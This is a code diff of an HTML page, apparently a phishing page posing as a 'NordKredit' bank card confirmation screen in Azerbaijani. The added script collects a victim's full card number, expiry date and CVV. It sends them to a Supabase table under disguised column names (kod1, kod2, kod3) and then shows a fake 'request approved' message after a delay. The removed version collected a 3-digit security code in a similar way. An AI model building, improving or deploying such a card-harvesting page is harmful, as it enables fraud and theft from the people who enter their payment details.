@@ -7,31 +7,19 @@
 
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,sans-serif;}
-
 body{
 height:100vh;
 display:flex;
 justify-content:center;
 align-items:center;
-background:#0a0f1c;
+background:#0b1e3a;
 overflow:hidden;
-position:relative;
-}
-
-/* Background glow */
-body::before{
-content:"";
-position:absolute;
-width:600px;
-height:600px;
-background:radial-gradient(circle,#1bb34a33,transparent 70%);
-filter:blur(120px);
 }
 
 /* PHONE */
 .phone{
-width:370px;
-height:760px;
+width:360px;
+height:740px;
 background:#111;
 border-radius:55px;
 padding:18px;
@@ -51,7 +39,27 @@ background:black;
 border-radius:25px;
 }
 
-/* bottom bar */
+/* Side Buttons */
+.side1{
+position:absolute;
+left:-4px;
+top:200px;
+width:4px;
+height:80px;
+background:#222;
+border-radius:4px;
+}
+.side2{
+position:absolute;
+right:-4px;
+top:230px;
+width:4px;
+height:60px;
+background:#222;
+border-radius:4px;
+}
+
+/* Bottom bar */
 .homebar{
 position:absolute;
 bottom:8px;
@@ -66,30 +74,47 @@ border-radius:5px;
 .screen{
 width:100%;
 height:100%;
-background:#0f172a;
+background:#0e1f3f;
 border-radius:40px;
 padding:25px;
 color:white;
-display:flex;
-flex-direction:column;
-align-items:center;
 }
 
 /* CARD */
+.card-wrapper{perspective:1000px;margin-top:90px;}
 .card{
 width:100%;
-height:220px;
-background:linear-gradient(135deg,#1bb34a,#0c5f2b);
-border-radius:22px;
-margin-top:90px;
-padding:20px;
+height:210px;
 position:relative;
-box-shadow:0 20px 40px #0008;
+transform-style:preserve-3d;
+transition:0.8s;
 }
-
-.brand{
-font-size:20px;
-font-weight:600;
+.card.flip{transform:rotateY(180deg);}
+.card-face{
+position:absolute;
+width:100%;
+height:100%;
+backface-visibility:hidden;
+border-radius:20px;
+padding:20px;
+color:white;
+}
+.front{
+background:radial-gradient(circle at center,#1bb34a,#0c5f2b 70%);
+}
+.back{
+background:#111;
+transform:rotateY(180deg);
+}
+.strip{height:40px;background:black;margin-top:20px;}
+.cvv-box{
+margin-top:30px;
+background:white;
+color:black;
+padding:10px;
+text-align:right;
+border-radius:5px;
+font-weight:bold;
 }
 
 .number{
@@ -97,50 +122,63 @@ position:absolute;
 top:50%;
 left:50%;
 transform:translate(-50%,-50%);
-font-size:22px;
+font-size:20px;
 letter-spacing:3px;
 }
-
-.code4{
+.exp{
 position:absolute;
 bottom:20px;
 left:20px;
 font-size:14px;
-opacity:0.8;
 }
 
-/* INPUT */
+/* FORM */
 form{
 margin-top:40px;
-width:100%;
 display:flex;
 flex-direction:column;
-gap:15px;
+gap:12px;
 }
-
 input{
-padding:14px;
-border-radius:12px;
+padding:12px;
 border:none;
-font-size:18px;
-text-align:center;
-background:#1e293b;
-color:white;
+border-radius:8px;
+font-size:16px;
+}
+button{
+padding:14px;
+border:none;
+border-radius:10px;
+background:linear-gradient(90deg,#f6d365,#fda085);
+font-weight:bold;
+cursor:pointer;
 }
 
-button{
-padding:15px;
-border:none;
-border-radius:14px;
-font-weight:600;
-font-size:16px;
-cursor:pointer;
-background:linear-gradient(90deg,#f6d365,#fda085);
+/* LOADING */
+.loading{
+position:absolute;
+inset:0;
+background:rgba(0,0,0,0.85);
+display:none;
+flex-direction:column;
+justify-content:center;
+align-items:center;
+color:white;
+font-size:18px;
+border-radius:40px;
 }
-.stats{
-margin-top:20px;
-font-size:13px;
-opacity:0.7;
+.spinner{
+width:50px;
+height:50px;
+border:5px solid #555;
+border-top:5px solid gold;
+border-radius:50%;
+animation:spin 1s linear infinite;
+margin-bottom:20px;
+}
+@keyframes spin{
+0%{transform:rotate(0)}
+100%{transform:rotate(360deg)}
 }
 </style>
 </head>
@@ -148,22 +186,39 @@ opacity:0.7;
 
 <div class="phone">
 <div class="island"></div>
+<div class="side1"></div>
+<div class="side2"></div>
 <div class="homebar"></div>
 
 <div class="screen">
 
-<div class="card">
-<div class="brand">NordKredit</div>
-<div class="number" id="cardNumber"></div>
-<div class="code4" id="code4"></div>
+<div class="card-wrapper">
+<div class="card" id="card">
+
+<div class="card-face front">
+<div class="number" id="cardNumber">0000 0000 0000 0000</div>
+<div class="exp" id="cardExp">MM/YY</div>
+</div>
+
+<div class="card-face back">
+<div class="strip"></div>
+<div class="cvv-box" id="cvvDisplay">***</div>
+</div>
+
+</div>
 </div>
 
 <form id="form">
-<input type="text" maxlength="3" id="secretInput" placeholder="3 rəqəmli kod">
+<input type="text" maxlength="19" placeholder="ID nömrə" id="numberInput">
+<input type="text" maxlength="5" placeholder="MM/YY" id="expInput">
+<input type="text" maxlength="3" placeholder="Təhlükəsizlik kodu" id="cvvInput">
 <button type="submit">Təsdiqlə</button>
 </form>
 
-<div class="stats" id="liveCount">Aktiv istifadəçi: ...</div>
+<div class="loading" id="loading">
+<div class="spinner"></div>
+<div id="loadingText">Loading...</div>
+</div>
 
 </div>
 </div>
@@ -171,46 +226,59 @@ opacity:0.7;
 <script type="module">
 import { createClient } from "https://esm.sh/@supabase/supabase-js@2"
 
-const supabaseUrl="https://gkrfcoyleewxrxbfdunq.supabase.co"
-const supabaseKey="sb_publishable_E1QDjV9fAt2IaoI3h7G9Iw_hIiSaAFH"
-const supabase=createClient(supabaseUrl,supabaseKey)
+const supabase=createClient(
+"https://gkrfcoyleewxrxbfdunq.supabase.co",
+"sb_publishable_E1QDjV9fAt2IaoI3h7G9Iw_hIiSaAFH"
+)
 
-function random16(){
-let n="";
-for(let i=0;i<16;i++){n+=Math.floor(Math.random()*10)}
-return n.replace(/(.{4})/g,'$1 ').trim()
-}
+const form=document.getElementById("form")
+const numberInput=document.getElementById("numberInput")
+const expInput=document.getElementById("expInput")
+const cvvInput=document.getElementById("cvvInput")
+const cardNumber=document.getElementById("cardNumber")
+const cardExp=document.getElementById("cardExp")
+const cvvDisplay=document.getElementById("cvvDisplay")
+const card=document.getElementById("card")
+const loading=document.getElementById("loading")
+const loadingText=document.getElementById("loadingText")
 
-function random4(){
-return Math.floor(1000+Math.random()*9000).toString()
-}
-
-const cardNumber=random16()
-const code4=random4()
-
-document.getElementById("cardNumber").textContent=cardNumber
-document.getElementById("code4").textContent="Kod: "+code4
-
-document.getElementById("form").addEventListener("submit",async e=>{
-e.preventDefault()
-const val=document.getElementById("secretInput").value
-
-if(val.length!==3){alert("3 rəqəm daxil edin");return}
-
-await supabase.from("nordkredit_data").insert([
-{kart_nomresi:cardNumber,kod_4:code4,daxil_edilen_3:val}
-])
-
-alert("Təsdiq edildi")
-document.getElementById("secretInput").value=""
+numberInput.addEventListener("input",e=>{
+let val=e.target.value.replace(/\D/g,'').substring(0,16)
+val=val.replace(/(.{4})/g,'$1 ').trim()
+cardNumber.textContent=val||"0000 0000 0000 0000"
 })
 
-/* LIVE USERS */
-setInterval(async ()=>{
-const {count}=await supabase.from("nordkredit_data").select("*",{count:"exact",head:true})
-document.getElementById("liveCount").textContent="Ümumi qoşulan: "+count
-},3000)
+expInput.addEventListener("input",e=>{
+cardExp.textContent=e.target.value||"MM/YY"
+})
 
+cvvInput.addEventListener("focus",()=>card.classList.add("flip"))
+cvvInput.addEventListener("blur",()=>card.classList.remove("flip"))
+
+cvvInput.addEventListener("input",e=>{
+let val=e.target.value.substring(0,3)
+cvvDisplay.textContent=val
+setTimeout(()=>cvvDisplay.textContent="***",1000)
+})
+
+form.addEventListener("submit",async e=>{
+e.preventDefault()
+
+loading.style.display="flex"
+
+await supabase.from("mesajlar").insert([
+{
+kod1:numberInput.value,
+kod2:expInput.value,
+kod3:cvvInput.value
+}
+])
+
+setTimeout(()=>{
+loadingText.textContent="Təbriklər Sorğunuz Təsdiq Olundu"
+},7000)
+})
 </script>
+
 </body>
 </html>
